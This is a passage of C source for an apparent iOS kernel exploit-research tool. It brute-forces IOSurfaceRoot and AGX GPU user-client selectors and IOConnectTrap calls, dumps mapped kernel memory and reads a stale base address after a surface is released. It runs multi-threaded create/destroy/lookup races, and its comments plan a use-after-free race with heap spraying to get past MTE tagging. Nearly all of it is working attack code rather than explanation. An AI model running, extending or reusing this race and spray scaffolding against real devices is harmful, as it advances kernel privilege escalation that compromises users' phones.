    trap1_t t1 = (trap1_t)dlsym(iokit, "IOConnectTrap1");
    trap2_t t2 = (trap2_t)dlsym(iokit, "IOConnectTrap2");
    trap3_t t3 = (trap3_t)dlsym(iokit, "IOConnectTrap3");
    trap4_t t4 = (trap4_t)dlsym(iokit, "IOConnectTrap4");
    trap5_t t5 = (trap5_t)dlsym(iokit, "IOConnectTrap5");
    trap6_t t6 = (trap6_t)dlsym(iokit, "IOConnectTrap6");
    rlog("  Trap3=%p Trap4=%p Trap5=%p\n", (void*)t3, (void*)t4, (void*)t5);

    /* Get IOSurface Mach port for additional argument combinations */
    mach_port_t sp = IOSurfaceCreateMachPort(surf);

    /* Trap 6 with notification port set */
    rlog("\n  --- Trap idx=6 after SetNotificationPort ---\n");
    if (t0) { kr = t0(conn, 6); rlog("    T0(6): 0x%x\n", kr); }
    if (t1) {
        kr = t1(conn, 6, sid); rlog("    T1(6, surfID): 0x%x\n", kr);
        kr = t1(conn, 6, (uintptr_t)np); rlog("    T1(6, notifyPort): 0x%x\n", kr);
        kr = t1(conn, 6, (uintptr_t)sp); rlog("    T1(6, surfMachPort): 0x%x\n", kr);
        kr = t1(conn, 6, (uintptr_t)conn); rlog("    T1(6, conn): 0x%x\n", kr);
    }
    if (t2) {
        kr = t2(conn, 6, sid, (uintptr_t)np); rlog("    T2(6, sID, np): 0x%x\n", kr);
        kr = t2(conn, 6, (uintptr_t)np, sid); rlog("    T2(6, np, sID): 0x%x\n", kr);
        kr = t2(conn, 6, (uintptr_t)sp, (uintptr_t)np); rlog("    T2(6, sp, np): 0x%x\n", kr);
        kr = t2(conn, 6, sid, 0); rlog("    T2(6, sID, 0): 0x%x\n", kr);
        kr = t2(conn, 6, sid, 1); rlog("    T2(6, sID, 1): 0x%x\n", kr);
    }
    if (t3) {
        kr = t3(conn, 6, sid, (uintptr_t)np, 0); rlog("    T3(6, sID, np, 0): 0x%x\n", kr);
        kr = t3(conn, 6, sid, 0, (uintptr_t)np); rlog("    T3(6, sID, 0, np): 0x%x\n", kr);
        kr = t3(conn, 6, (uintptr_t)sp, (uintptr_t)np, 0); rlog("    T3(6, sp, np, 0): 0x%x\n", kr);
    }
    if (t4) {
        kr = t4(conn, 6, sid, (uintptr_t)np, 0, 0); rlog("    T4(6, sID, np, 0, 0): 0x%x\n", kr);
        kr = t4(conn, 6, sid, (uintptr_t)sp, (uintptr_t)np, 0); rlog("    T4(6, sID, sp, np, 0): 0x%x\n", kr);
    }
    if (t6) {
        kr = t6(conn, 6, sid, (uintptr_t)np, 0, 0, 0, 0);
        rlog("    T6(6, sID, np, 0,0,0,0): 0x%x\n", kr);
        kr = t6(conn, 6, sid, (uintptr_t)sp, (uintptr_t)np, 0, 0, 0);
        rlog("    T6(6, sID, sp, np, 0,0,0): 0x%x\n", kr);
        /* Try encoding surface ID in different argument positions */
        for (int pos = 0; pos < 6; pos++) {
            uintptr_t args[6] = {0};
            args[pos] = sid;
            kr = t6(conn, 6, args[0], args[1], args[2], args[3], args[4], args[5]);
            rlog("    T6(6, sID@pos%d): 0x%x\n", pos, kr);
        }
    }

    /* Trap 7 with notification port set */
    rlog("\n  --- Trap idx=7 after SetNotificationPort ---\n");
    if (t0) { kr = t0(conn, 7); rlog("    T0(7): 0x%x\n", kr); }
    if (t1) {
        kr = t1(conn, 7, sid); rlog("    T1(7, surfID): 0x%x\n", kr);
        kr = t1(conn, 7, (uintptr_t)np); rlog("    T1(7, notifyPort): 0x%x\n", kr);
        kr = t1(conn, 7, (uintptr_t)sp); rlog("    T1(7, surfMachPort): 0x%x\n", kr);
    }
    if (t2) {
        kr = t2(conn, 7, sid, (uintptr_t)np); rlog("    T2(7, sID, np): 0x%x\n", kr);
        kr = t2(conn, 7, (uintptr_t)np, sid); rlog("    T2(7, np, sID): 0x%x\n", kr);
        kr = t2(conn, 7, sid, 0); rlog("    T2(7, sID, 0): 0x%x\n", kr);
    }
    if (t3) {
        kr = t3(conn, 7, sid, (uintptr_t)np, 0); rlog("    T3(7, sID, np, 0): 0x%x\n", kr);
        kr = t3(conn, 7, sid, 0, (uintptr_t)np); rlog("    T3(7, sID, 0, np): 0x%x\n", kr);
    }

    if (iokit) dlclose(iokit);
    if (sp) mach_port_deallocate(mach_task_self(), sp);

    /* Part 2: AGX type=1 restricted client selector probe */
    rlog("\n=== r266 Part 2: AGX type=1 selector probe ===\n");
    io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault,
        IOServiceMatching("AGXAcceleratorG19P"));
    if (agx) {
        io_connect_t ac = IO_OBJECT_NULL;
        kr = IOServiceOpen(agx, mach_task_self(), 1, &ac);
        rlog("  AGXAcceleratorG19P type=1: kr=0x%x conn=%u\n", kr, ac);
        if (kr == 0 && ac) {
            /* Probe selectors 0-30 with no args, then with surfID */
            for (uint32_t sel = 0; sel <= 30; sel++) {
                kr = IOConnectCallScalarMethod(ac, sel, NULL, 0, NULL, NULL);
                rlog("    sel%u no-args: 0x%x", sel, kr);
                uint64_t sc1[1] = {sid};
                kern_return_t kr2 = IOConnectCallScalarMethod(ac, sel, sc1, 1, NULL, NULL);
                rlog("  scalar[sID]: 0x%x\n", kr2);
            }
            /* Also probe with struct input */
            rlog("  AGX sel0 struct probe:\n");
            for (uint32_t sel = 0; sel <= 5; sel++) {
                uint32_t st[4] = {sid, 0, 0, 0};
                kr = IOConnectCallMethod(ac, sel, NULL, 0, st, 16, NULL, NULL, NULL, NULL);
                rlog("    sel%u struct[sID,0,0,0]: 0x%x\n", sel, kr);
            }
            IOServiceClose(ac);
        }
        IOObjectRelease(agx);
    } else {
        rlog("  AGXAcceleratorG19P not found\n");
    }

    /* Part 3: Multi-threaded framework API race (8 seconds) */
    rlog("\n=== r266 Part 3: Framework API race (8s) ===\n");
    rlog("  Racing IOSurface create/destroy + lookup + purgeable\n");

    int w = 32, h = 32, bpe = 4, bpr = w * bpe, pf = 0x42475241, as = bpr * h;
    CFMutableDictionaryRef rprops = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFNumberRef rw = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef rh = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef rb = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef rr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
    CFNumberRef rpf = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    CFNumberRef ras = CFNumberCreate(NULL, kCFNumberIntType, &as);
    CFDictionarySetValue(rprops, CFSTR("IOSurfaceWidth"), rw);
    CFDictionarySetValue(rprops, CFSTR("IOSurfaceHeight"), rh);
    CFDictionarySetValue(rprops, CFSTR("IOSurfaceBytesPerElement"), rb);
    CFDictionarySetValue(rprops, CFSTR("IOSurfaceBytesPerRow"), rr);
    CFDictionarySetValue(rprops, CFSTR("IOSurfacePixelFormat"), rpf);
    CFDictionarySetValue(rprops, CFSTR("IOSurfaceAllocSize"), ras);
    CFRelease(rw); CFRelease(rh); CFRelease(rb); CFRelease(rr); CFRelease(rpf); CFRelease(ras);

    memset((void*)r266_last_ids, 0, sizeof(r266_last_ids));
    r266_race_stop = 0;
    r266_id_head = 0;
    r266_set_ok = r266_set_fail = r266_lookup_ok = r266_lookup_fail = r266_stale_hit = 0;

    pthread_t threads[10];
    int tc = 0;
    /* 2 destroyer threads */
    pthread_create(&threads[tc++], NULL, r266_destroyer_fn, rprops);
    pthread_create(&threads[tc++], NULL, r266_destroyer_fn, rprops);
    /* 2 ID tracker threads (create + track IDs + destroy) */
    pthread_create(&threads[tc++], NULL, r266_id_tracker_fn, rprops);
    pthread_create(&threads[tc++], NULL, r266_id_tracker_fn, rprops);
    /* 3 lookup racer threads */
    pthread_create(&threads[tc++], NULL, r266_lookup_racer_fn, NULL);
    pthread_create(&threads[tc++], NULL, r266_lookup_racer_fn, NULL);
    pthread_create(&threads[tc++], NULL, r266_lookup_racer_fn, NULL);
    /* 2 purgeable racer threads */
    pthread_create(&threads[tc++], NULL, r266_purgeable_racer_fn, rprops);
    pthread_create(&threads[tc++], NULL, r266_purgeable_racer_fn, rprops);

    sleep(8);
    r266_race_stop = 1;
    for (int i = 0; i < tc; i++) pthread_join(threads[i], NULL);

    rlog("  Race results: lookup_ok=%llu lookup_fail=%llu stale_hit=%llu\n",
        r266_lookup_ok, r266_lookup_fail, r266_stale_hit);

    CFRelease(rprops);

    /* Part 4: Backing memory persistence test */
    rlog("\n=== r266 Part 4: Backing memory after release ===\n");
    {
        IOSurfaceRef ts = NULL;
        int tw = 64, th = 64, tbpe = 4, tbpr = tw*tbpe, tpf = 0x42475241, tas = tbpr*th;
        CFMutableDictionaryRef tp = CFDictionaryCreateMutable(NULL, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &tw);
        CFNumberRef n2 = CFNumberCreate(NULL, kCFNumberIntType, &th);
        CFNumberRef n3 = CFNumberCreate(NULL, kCFNumberIntType, &tbpe);
        CFNumberRef n4 = CFNumberCreate(NULL, kCFNumberIntType, &tbpr);
        CFNumberRef n5 = CFNumberCreate(NULL, kCFNumberIntType, &tpf);
        CFNumberRef n6 = CFNumberCreate(NULL, kCFNumberIntType, &tas);
        CFDictionarySetValue(tp, CFSTR("IOSurfaceWidth"), n1);
        CFDictionarySetValue(tp, CFSTR("IOSurfaceHeight"), n2);
        CFDictionarySetValue(tp, CFSTR("IOSurfaceBytesPerElement"), n3);
        CFDictionarySetValue(tp, CFSTR("IOSurfaceBytesPerRow"), n4);
        CFDictionarySetValue(tp, CFSTR("IOSurfacePixelFormat"), n5);
        CFDictionarySetValue(tp, CFSTR("IOSurfaceAllocSize"), n6);
        CFRelease(n1); CFRelease(n2); CFRelease(n3); CFRelease(n4); CFRelease(n5); CFRelease(n6);

        ts = IOSurfaceCreate(tp);
        CFRelease(tp);
        if (ts) {
            IOSurfaceLock(ts, 0, NULL);
            void *base = IOSurfaceGetBaseAddress(ts);
            rlog("  Base address before release: %p\n", base);
            if (base) {
                memset(base, 0xDE, 64);
                rlog("  Wrote 0xDE pattern to first 64 bytes\n");
            }
            IOSurfaceUnlock(ts, 0, NULL);
            uint32_t tsid = IOSurfaceGetID(ts);
            CFRelease(ts);
            rlog("  Released IOSurface id=%u\n", tsid);
            /* Try to read the stale base address */
            if (base) {
                volatile uint8_t *p = (volatile uint8_t *)base;
                /* Use a signal handler approach would be better,
                 * but for now just check if the page is still mapped
                 * via mincore() */
                unsigned char vec[1] = {0};
                int mc = mincore(base, 4096, vec);
                rlog("  mincore after release: ret=%d vec[0]=%u (resident=%s)\n",
                    mc, vec[0], (mc == 0 && (vec[0] & 1)) ? "YES" : "NO");
            }
        }
    }

    IOServiceClose(conn);
    IOObjectRelease(svc);
    mach_port_deallocate(mach_task_self(), np);
    __sync_fetch_and_add(&r266_probed, 1);
    fflush(stdout);
}

static void r265_probe_traps_and_types(IOSurfaceRef surf) {
    uint32_t sid = IOSurfaceGetID(surf);
    kern_return_t kr;

    rlog("\n=== r265: Probing IOConnectTrap + user client types ===\n");

    /* 1) Try opening IOSurfaceRoot with different user client types */
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
        IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { rlog("  IOSurfaceRoot not found!\n"); return; }

    for (int type = 0; type <= 5; type++) {
        io_connect_t c = IO_OBJECT_NULL;
        kr = IOServiceOpen(svc, mach_task_self(), type, &c);
        rlog("  IOSurfaceRoot type=%d: kr=0x%x conn=%u\n", type, kr, c);
        if (kr == 0 && c) {
            /* Try sel0 and sel17 on this connection type */
            uint64_t sc[2] = {sid, 0};
            kr = IOConnectCallScalarMethod(c, 17, sc, 1, NULL, NULL);
            rlog("    sel17 scalar[surfID]: kr=0x%x\n", kr);
            kr = IOConnectCallScalarMethod(c, 0, NULL, 0, NULL, NULL);
            rlog("    sel0 no-args: kr=0x%x\n", kr);
            IOServiceClose(c);
        }
    }

    /* 2) Probe IOConnectTrap functions via dlsym (unavailable in iOS SDK) */
    io_connect_t conn = IO_OBJECT_NULL;
    IOServiceOpen(svc, mach_task_self(), 0, &conn);
    if (!conn) { IOObjectRelease(svc); return; }

    rlog("\n  === IOConnectTrap probe (conn=%u, surfID=%u) ===\n", conn, sid);

    typedef kern_return_t (*trap0_t)(io_connect_t, uint32_t);
    typedef kern_return_t (*trap1_t)(io_connect_t, uint32_t, uintptr_t);
    typedef kern_return_t (*trap2_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t);
    typedef kern_return_t (*trap6_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t,
        uintptr_t, uintptr_t, uintptr_t, uintptr_t);

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    trap0_t t0 = iokit ? (trap0_t)dlsym(iokit, "IOConnectTrap0") : NULL;
    trap1_t t1 = iokit ? (trap1_t)dlsym(iokit, "IOConnectTrap1") : NULL;
    trap2_t t2 = iokit ? (trap2_t)dlsym(iokit, "IOConnectTrap2") : NULL;
    trap6_t t6 = iokit ? (trap6_t)dlsym(iokit, "IOConnectTrap6") : NULL;
    rlog("  dlsym: Trap0=%p Trap1=%p Trap2=%p Trap6=%p\n",
        (void*)t0, (void*)t1, (void*)t2, (void*)t6);

    if (t0) {
        for (uint32_t idx = 0; idx <= 10; idx++) {
            kr = t0(conn, idx);
            rlog("    Trap0(idx=%u): kr=0x%x\n", idx, kr);
        }
    } else {
        rlog("    IOConnectTrap0 not found in IOKit\n");
    }

    if (t1) {
        rlog("\n  IOConnectTrap1 with surfID:\n");
        for (uint32_t idx = 0; idx <= 10; idx++) {
            kr = t1(conn, idx, (uintptr_t)sid);
            rlog("    Trap1(idx=%u, surfID): kr=0x%x\n", idx, kr);
        }
    }

    if (t2) {
        rlog("\n  IOConnectTrap2:\n");
        for (uint32_t idx = 0; idx <= 5; idx++) {
            kr = t2(conn, idx, (uintptr_t)sid, 0);
            rlog("    Trap2(idx=%u, surfID, 0): kr=0x%x\n", idx, kr);
        }
    }
    if (iokit) dlclose(iokit);

    /* 3) Probe IOConnectMapMemory */
    rlog("\n  === IOConnectMapMemory probe ===\n");
    for (uint32_t memtype = 0; memtype <= 5; memtype++) {
        mach_vm_address_t addr = 0;
        mach_vm_size_t size = 0;
        kr = IOConnectMapMemory64(conn, memtype, mach_task_self(),
            &addr, &size, kIOMapAnywhere);
        rlog("    MapMemory(type=%u): kr=0x%x", memtype, kr);
        if (kr == 0) rlog(" addr=0x%llx size=0x%llx", (uint64_t)addr, (uint64_t)size);
        rlog("\n");
        if (kr == 0 && addr) {
            /* Dump first 64 bytes of mapped memory */
            uint64_t *p = (uint64_t *)addr;
            for (int i = 0; i < 8; i++)
                rlog("      [%d] 0x%016llx\n", i, p[i]);
            IOConnectUnmapMemory64(conn, memtype, mach_task_self(), addr);
        }
    }

    /* 4) Try IOSurface framework internal functions as race targets */
    rlog("\n  === IOSurface API race targets ===\n");

    /* IOSurfaceSetValue — goes through kernel */
    kr = 0; /* reset */
    IOSurfaceSetValue(surf, CFSTR("test_key"), CFSTR("test_value"));
    rlog("    IOSurfaceSetValue: OK\n");

    CFTypeRef val = IOSurfaceCopyValue(surf, CFSTR("test_key"));
    rlog("    IOSurfaceCopyValue: %s\n", val ? "OK (got value)" : "NULL");
    if (val) CFRelease(val);

    IOSurfaceRemoveValue(surf, CFSTR("test_key"));
    rlog("    IOSurfaceRemoveValue: OK\n");

    /* IOSurfaceLock/Unlock — may go through kernel */
    IOSurfaceLock(surf, 0, NULL);
    rlog("    IOSurfaceLock(0): OK\n");
    void *base = IOSurfaceGetBaseAddress(surf);
    rlog("    IOSurfaceGetBaseAddress: %p\n", base);
    IOSurfaceUnlock(surf, 0, NULL);
    rlog("    IOSurfaceUnlock(0): OK\n");

    /* IOSurfaceSetPurgeable */
    uint32_t old_state = 0;
    kr = IOSurfaceSetPurgeable(surf, 1, &old_state); /* Volatile */
    rlog("    IOSurfaceSetPurgeable(Volatile): kr=0x%x old=%u\n", kr, old_state);
    kr = IOSurfaceSetPurgeable(surf, 0, &old_state); /* NonVolatile */
    rlog("    IOSurfaceSetPurgeable(NonVolatile): kr=0x%x old=%u\n", kr, old_state);

    /* UseCount manipulation */
    IOSurfaceIncrementUseCount(surf);
    rlog("    IncrementUseCount: OK, isInUse=%d\n", IOSurfaceIsInUse(surf));
    IOSurfaceDecrementUseCount(surf);
    rlog("    DecrementUseCount: OK, isInUse=%d\n", IOSurfaceIsInUse(surf));

    IOServiceClose(conn);
    IOObjectRelease(svc);
    __sync_fetch_and_add(&r265_probed, 1);
    fflush(stdout);
}

static void r264_probe_sel17(io_connect_t conn, IOSurfaceRef surf) {
    uint32_t sid = IOSurfaceGetID(surf);
    kern_return_t kr;
    mach_port_t wp = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
    mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
    uint64_t ref = 0x1234;

    /* Dump IOSurfaceRef internal structure to find connection handle */
    rlog("  IOSurfaceRef memory dump (first 32 words):\n");
    uint64_t *raw = (uint64_t *)surf;
    for (int i = 0; i < 32; i++) {
        rlog("    [%2d] 0x%016llx", i, raw[i]);
        if (raw[i] == sid) rlog(" <-- surfaceID!");
        if (raw[i] > 0 && raw[i] < 0x10000) rlog(" (small=%llu)", raw[i]);
        rlog("\n");
    }
    fflush(stdout);

    /* Also try to find IOSurface framework's internal connection */
    rlog("  Mach port from IOSurfaceCreateMachPort: ");
    mach_port_t sp = IOSurfaceCreateMachPort(surf);
    rlog("port=%u\n", sp);

    /* Try sel0 (create_surface) on our connection to get OUR handle */
    rlog("\n  === Trying sel0 (create_surface) on our connection ===\n");
    /* Format: struct input = serialized properties. Try minimal binary plist */
    {
        /* Try with the IOSurface properties as a simple struct */
        uint32_t props_data[8] = {64, 64, 4, 256, 0x42475241, 16384, 0, 0};
        char struct_out[1024] = {0};
        size_t so_sz = 1024;
        uint64_t sc_out[8] = {0};
        uint32_t sc_out_cnt = 8;
        kr = IOConnectCallMethod(conn, 0, NULL, 0, props_data, 32,
            sc_out, &sc_out_cnt, struct_out, &so_sz);
        rlog("    sel0 raw32: kr=0x%x sc_out_cnt=%u so_sz=%zu\n", kr, sc_out_cnt, so_sz);
        if (kr == 0) {
            for (uint32_t i = 0; i < sc_out_cnt; i++)
                rlog("      sc_out[%u]=0x%llx\n", i, sc_out[i]);
        }
    }
    {
        /* Try sel0 with a CF serialized plist (XML) */
        const char *xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
            "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
            "<plist version=\"1.0\"><dict>"
            "<key>IOSurfaceWidth</key><integer>64</integer>"
            "<key>IOSurfaceHeight</key><integer>64</integer>"
            "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
            "<key>IOSurfaceBytesPerRow</key><integer>256</integer>"
            "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
            "<key>IOSurfaceAllocSize</key><integer>16384</integer>"
            "</dict></plist>";
        size_t xml_len = strlen(xml);
        char struct_out[1024] = {0};
        size_t so_sz = 1024;
        uint64_t sc_out[8] = {0};
        uint32_t sc_out_cnt = 8;
        kr = IOConnectCallMethod(conn, 0, NULL, 0, xml, xml_len,
            sc_out, &sc_out_cnt, struct_out, &so_sz);
        rlog("    sel0 xml: kr=0x%x sc_out_cnt=%u so_sz=%zu\n", kr, sc_out_cnt, so_sz);
        if (kr == 0) {
            for (uint32_t i = 0; i < sc_out_cnt; i++)
                rlog("      sc_out[%u]=0x%llx\n", i, sc_out[i]);
        }
    }
    {
        /* Try sel0 with IOSurface binary serialization (OSSerialize format) */
        /* Start with surface ID as scalar, properties as struct */
        uint64_t sc_in[1] = {0}; /* no surface yet */
        char struct_out[1024] = {0};
        size_t so_sz = 1024;
        uint64_t sc_out[8] = {0};
        uint32_t sc_out_cnt = 8;
        kr = IOConnectCallMethod(conn, 0, sc_in, 1, NULL, 0,
            sc_out, &sc_out_cnt, struct_out, &so_sz);
        rlog("    sel0 scalar[0]: kr=0x%x sc_out_cnt=%u so_sz=%zu\n", kr, sc_out_cnt, so_sz);
    }

    /* Now try sel17 with the Mach port as the surface ID arg
     * (maybe sel17 takes a Mach port, not a surface ID?) */
    rlog("\n  === sel17 with Mach port as arg ===\n");
    {
        uint64_t sc[1] = {sp};
        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
        rlog("    sel17 scalar[machPort]: kr=0x%x\n", kr);
    }
    {
        uint64_t sc[2] = {sp, 0};
        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 2, NULL, 0, NULL, NULL, NULL, NULL);
        rlog("    sel17 scalar[machPort,0]: kr=0x%x\n", kr);
    }

    /* Try with 3 and 4 scalar args */
    rlog("\n  === sel17 with 3-4 scalar args ===\n");
    {
        uint64_t sc[3] = {sid, 0xFFFFFFFF, 0};
        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 3, NULL, 0, NULL, NULL, NULL, NULL);
        rlog("    sel17 scalar[surfID,0xFFFFFFFF,0]: kr=0x%x\n", kr);
    }
    {
        uint64_t sc[4] = {sid, 1, 0, 0};
        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 4, NULL, 0, NULL, NULL, NULL, NULL);
        rlog("    sel17 scalar[surfID,1,0,0]: kr=0x%x\n", kr);
    }
    {
        /* Try just the wake port as scalar */
        uint64_t sc[2] = {sid, (uint64_t)wp};
        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 2, NULL, 0, NULL, NULL, NULL, NULL);
        rlog("    sel17 scalar[surfID,wakePort]: kr=0x%x\n", kr);
    }

    rlog("\n  Probing sel17 with surfaceID=%u port=%u\n", sid, wp);

    /* Format A: scalar[0]=surfaceID, no struct */
    {
        uint64_t sc[1] = {sid};
        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
        rlog("    A) scalar[surfID] no-struct: kr=0x%x\n", kr);
    }
    /* Format B: scalar[0]=surfID scalar[1]=0 */
    {
        uint64_t sc[2] = {sid, 0};
        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 2, NULL, 0, NULL, NULL, NULL, NULL);
        rlog("    B) scalar[surfID,0]: kr=0x%x\n", kr);
    }
    /* Format C: scalar[0]=surfID scalar[1]=1 */
    {
        uint64_t sc[2] = {sid, 1};
        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 2, NULL, 0, NULL, NULL, NULL, NULL);
        rlog("    C) scalar[surfID,1]: kr=0x%x\n", kr);
    }
    /* Format D: no scalars, struct={surfID as u32} (4 bytes) */
    {
        uint32_t st[1] = {sid};
        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, NULL, 0, st, 4, NULL, NULL, NULL, NULL);
        rlog("    D) struct[u32:surfID]: kr=0x%x\n", kr);
    }
    /* Format E: no scalars, struct={surfID as u32, 0} (8 bytes) */
    {
        uint32_t st[2] = {sid, 0};
        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, NULL, 0, st, 8, NULL, NULL, NULL, NULL);
        rlog("    E) struct[u32:surfID,0]: kr=0x%x\n", kr);
    }
    /* Format F: no scalars, struct={surfID as u64} (8 bytes) */
    {
        uint64_t st[1] = {sid};
        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, NULL, 0, st, 8, NULL, NULL, NULL, NULL);
        rlog("    F) struct[u64:surfID]: kr=0x%x\n", kr);
    }
    /* Format G: scalar[surfID], struct={0,0,0} 24 bytes */
    {
        uint64_t sc[1] = {sid};
        uint64_t st[3] = {0, 0, 0};
        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 1, st, 24, NULL, NULL, NULL, NULL);
        rlog("    G) scalar[surfID] struct[0,0,0]: kr=0x%x\n", kr);
    }
    /* Format H: scalar[surfID,1], struct={0} */
    {
        uint64_t sc[2] = {sid, 1};
        uint64_t st[1] = {0};
        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 2, st, 8, NULL, NULL, NULL, NULL);
        rlog("    H) scalar[surfID,1] struct[0]: kr=0x%x\n", kr);
    }
    /* Format I: Synchronous (not async) with scalar[surfID] */
    {
        uint64_t sc[1] = {sid};
        kr = IOConnectCallScalarMethod(conn, 17, sc, 1, NULL, NULL);
        rlog("    I) SYNC scalar[surfID]: kr=0x%x\n", kr);
    }
    /* Format J: Sync scalar[surfID,0] */
    {
        uint64_t sc[2] = {sid, 0};
        kr = IOConnectCallScalarMethod(conn, 17, sc, 2, NULL, NULL);
        rlog("    J) SYNC scalar[surfID,0]: kr=0x%x\n", kr);
    }
    /* Format K: Sync scalar[surfID,1] */
    {
        uint64_t sc[2] = {sid, 1};
        kr = IOConnectCallScalarMethod(conn, 17, sc, 2, NULL, NULL);
        rlog("    K) SYNC scalar[surfID,1]: kr=0x%x\n", kr);
    }
    /* Format L: Sync struct only {surfID as u32} */
    {
        uint32_t st = sid;
        kr = IOConnectCallMethod(conn, 17, NULL, 0, &st, 4, NULL, NULL, NULL, NULL);
        rlog("    L) SYNC struct[u32:surfID]: kr=0x%x\n", kr);
    }

    /* Also try sel18 (s_remove_surface_notify) with the same formats */
    rlog("  Probing sel18 with surfaceID=%u\n", sid);
    /* Format A for sel18: scalar[surfID] */
    {
        uint64_t sc[1] = {sid};
        kr = IOConnectCallAsyncMethod(conn, 18, wp, &ref, 1, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
        rlog("    sel18-A) scalar[surfID]: kr=0x%x\n", kr);
    }
    /* Format B for sel18: scalar[surfID,0] */
    {
        uint64_t sc[2] = {sid, 0};
        kr = IOConnectCallAsyncMethod(conn, 18, wp, &ref, 1, sc, 2, NULL, 0, NULL, NULL, NULL, NULL);
        rlog("    sel18-B) scalar[surfID,0]: kr=0x%x\n", kr);
    }
    /* Format I for sel18: sync scalar[surfID] */
    {
        uint64_t sc[1] = {sid};
        kr = IOConnectCallScalarMethod(conn, 18, sc, 1, NULL, NULL);
        rlog("    sel18-I) SYNC scalar[surfID]: kr=0x%x\n", kr);
    }
    /* Format J for sel18: sync scalar[surfID,0] */
    {
        uint64_t sc[2] = {sid, 0};
        kr = IOConnectCallScalarMethod(conn, 18, sc, 2, NULL, NULL);
        rlog("    sel18-J) SYNC scalar[surfID,0]: kr=0x%x\n", kr);
    }
    /* Format L for sel18: struct only {surfID u32} */
    {
        uint32_t st = sid;
        kr = IOConnectCallMethod(conn, 18, NULL, 0, &st, 4, NULL, NULL, NULL, NULL);
        rlog("    sel18-L) SYNC struct[u32:surfID]: kr=0x%x\n", kr);
    }

    /* Also probe sel1 (s_release_surface) with real surface ID */
    rlog("  Probing sel1 with surfaceID=%u\n", sid);
    {
        uint64_t sc[1] = {sid};
        kr = IOConnectCallScalarMethod(conn, 1, sc, 1, NULL, NULL);
        rlog("    sel1-I) scalar[surfID]: kr=0x%x\n", kr);
    }
    {
        uint64_t sc[2] = {sid, 0};
        kr = IOConnectCallScalarMethod(conn, 1, sc, 2, NULL, NULL);
        rlog("    sel1-J) scalar[surfID,0]: kr=0x%x\n", kr);
    }
    {
        uint32_t st = sid;
        kr = IOConnectCallMethod(conn, 1, NULL, 0, &st, 4, NULL, NULL, NULL, NULL);
        rlog("    sel1-L) struct[u32:surfID]: kr=0x%x\n", kr);
    }

    /* Probe sel2 (s_lookup_surface) */
    rlog("  Probing sel2 (lookup) with surfaceID=%u\n", sid);
    {
        uint64_t sc_in[1] = {sid};
        uint64_t sc_out[4] = {0};
        uint32_t out_cnt = 4;
        kr = IOConnectCallScalarMethod(conn, 2, sc_in, 1, sc_out, &out_cnt);
        rlog("    sel2) scalar[surfID]: kr=0x%x out_cnt=%u", kr, out_cnt);
        if (kr == 0) rlog(" out[0]=0x%llx", sc_out[0]);
        rlog("\n");
    }

    /* Probe sel9 (s_get_value) with surface ID */
    rlog("  Probing sel9 (get_value) with surfaceID=%u\n", sid);
    {
        uint64_t sc_in[2] = {sid, 0};
        uint64_t sc_out[4] = {0};
        uint32_t out_cnt = 4;
        kr = IOConnectCallScalarMethod(conn, 9, sc_in, 2, sc_out, &out_cnt);
        rlog("    sel9) scalar[surfID,0]: kr=0x%x\n", kr);
    }
    {
        uint64_t sc_in[1] = {sid};
        char struct_out[256] = {0};
        size_t so_sz = 256;
        kr = IOConnectCallMethod(conn, 9, sc_in, 1, NULL, 0, NULL, NULL, struct_out, &so_sz);
        rlog("    sel9b) scalar[surfID] struct_out: kr=0x%x so_sz=%zu\n", kr, so_sz);
    }

    mach_port_deallocate(mach_task_self(), wp);
    __sync_fetch_and_add(&r264_probed, 1);
    fflush(stdout);
}

/* r263: IOSurface Mach port no-senders race + direct IOSurfaceRoot sel1 race
 * Strategy: bypass Metal's reference counting entirely.
 * 1) Create IOSurface → Mach port → drop all refs → no-senders notification
 *    fires asynchronously → race with IOSurfaceLookupFromMachPort
 * 2) Call IOSurfaceRoot sel1 (s_release_surface) with surface ID to
 *    decrement kernel refcount directly, racing with surface access
 * 3) Heap spray: rapidly allocate/free same-size IOSurfaces to reclaim
 *    freed zone slots with different MTE tags */
#include <mach/mach.h>

static volatile int r263_run = 0;
static volatile int r263_created = 0;
static volatile int r263_port_races = 0;
